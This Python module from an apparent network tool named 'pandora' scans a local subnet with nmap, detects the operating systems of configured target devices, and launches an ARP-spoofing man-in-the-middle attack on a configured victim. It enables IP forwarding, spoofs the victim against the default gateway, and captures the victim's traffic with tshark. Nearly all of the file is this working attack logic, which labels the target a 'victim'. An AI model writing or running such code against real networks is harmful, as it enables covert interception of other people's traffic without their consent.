import os
from datetime import datetime
from pandora.utils import utils
from pandora.shell import arpspoof, tshark, nmap
from pandora.definitions import LOGS_PATH
from pandora.config import NMAP_TARGETS, MITM_TARGET

ARPSPOOF = arpspoof.Arpspoof()
TSHARK = tshark.Tshark()
NMAP = nmap.Nmap()

def macs_equal(mac1, mac2):
    return mac1.lower() == mac2.lower()

def normalize_mac(mac):
    return mac.upper()

@utils.logging
def nmap_job(ipv4, netmask, ifname):
    try:
        nmap_job.targets
    except AttributeError:
        nmap_job.targets = list(NMAP_TARGETS)
    # if not hasattr(nmap_job, "targets"):
    #     nmap_job.targets = NMAP_TARGETS
    if nmap_job.targets:
        discoverable_hosts = discover_hosts_key_mac(ipv4, netmask, ifname)
        print(discoverable_hosts)
        for target_mac in tuple(nmap_job.targets):
            target_ip = discoverable_hosts.get(normalize_mac(target_mac))
            if target_ip:
                print(f"Detecting OS for {target_mac}/{target_ip}")
                NMAP.save_os(target_ip, ifname)
                nmap_job.targets.remove(target_mac)

def discover_hosts_key_mac(ipv4, netmask, ifname):
    """Return dict {MAC: IPv4} for all IP addresses detected in a subnetwork."""
    subnet = utils.get_subnet(ipv4, netmask)
    return NMAP.discover_hosts_key_mac(subnet, ifname)

def discover_hosts(ipv4, netmask, ifname):
    """Return dict {ipv4: mac} for all IP addresses detected in a subnetwork. If the MAC address cant be detected the entry is {ipv4: None}"""
    subnet = utils.get_subnet(ipv4, netmask)
    return NMAP.discover_hosts(subnet, ifname)

# def recollection(interface):
#     filename = "discoverable_hosts.log"
#     filepath = os.path.join(LOGS_PATH, filename)
#     subnet = utils.get_subnet(interface.get('ipv4'), interface.get('netmask'))
#     discoverable_hosts = NMAP.discover_hosts(subnet)
#     nmap_recollection(discoverable_hosts)
#     if TARGET_MAC not in discoverable_hosts or TARGET_MAC is None:
#         fh = open(filepath, 'a')
#         for ipv4, mac in discoverable_hosts.items():
#             now = datetime.now().strftime("%d-%m-%y-%H:%M:%S.%f")
#             fh.append(f"[{now}]: {ipv4}: {mac}")
#         fh.close()
#     else:
#         mitm_recollection(interface, TARGET_MAC)


# def nmap_recollection(discoverable_hosts):
#     #First we get the SO of the targets. 
#     targets = []
#     #Only targets are analysed
#     if TARGETS_IPS or TARGETS_MACS: 
#         for ipv4, mac in discoverable_hosts.items():
#             if ipv4 in TARGETS_IPS:
#                 targets.append((ipv4, mac))
#             elif mac in TARGETS_MACS:
#                 targets.append((ipv4, mac))
#     #All ips are analysed
#     else:
#         targets = discoverable_hosts.items()
#     for ipv4, mac in targets:
#         NMAP.save_os(ipv4)


@utils.logging
def mitm_job(ipv4, netmask, ifname):
    if MITM_TARGET:
        try:
            TSHARK.restart_tshark(ifname, mitm_job.targetip)
        except AttributeError:
            print("MITM Recollection")
            discoverable_hosts = discover_hosts_key_mac(ipv4, netmask, ifname)
            print(discoverable_hosts)
            if normalize_mac(MITM_TARGET) in discoverable_hosts.keys():
                print(f"MITM in progress. Target: {MITM_TARGET}")
                targetip = discoverable_hosts.get(MITM_TARGET)
                gateway = utils.get_default_gateway_linux(ifname)
                mitm_arpspoof(ifname, targetip, gateway)
                generate_logs(ifname, targetip)
                mitm_job.targetip = targetip
    # if not hasattr(mitm_job, "targetip"):
    #     print("MITM Recollection")
    #     discoverable_hosts = discover_hosts_key_mac(ipv4, netmask, ifname)
    #     print(discoverable_hosts)
    #     if MITM_TARGET in discoverable_hosts.keys():
    #         print(f"MITM in progress. Target: {MITM_TARGET}")
    #         targetip = discoverable_hosts.get(MITM_TARGET)
    #         gateway = utils.get_default_gateway_linux(ifname)
    #         mitm_arpspoof(ifname, targetip, gateway)
    #         generate_logs(ifname, targetip)
    #         mitm_job.targetip = targetip
    # else:
    #     TSHARK.restart_tshark(ifname, mitm_job.targetip)

def mitm_arpspoof(interface, ip_victim, ip_router):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    ARPSPOOF.spoof(ip_victim, ip_router, interface)
    #print(spoofing)

def generate_logs(interface, victim_ip):
    TSHARK.execute_command(interface, victim_ip)
    #print(log_generator)

@utils.logging
def restart_tshark_job(ifname, targetip):
    TSHARK.restart_tshark(ifname, targetip)
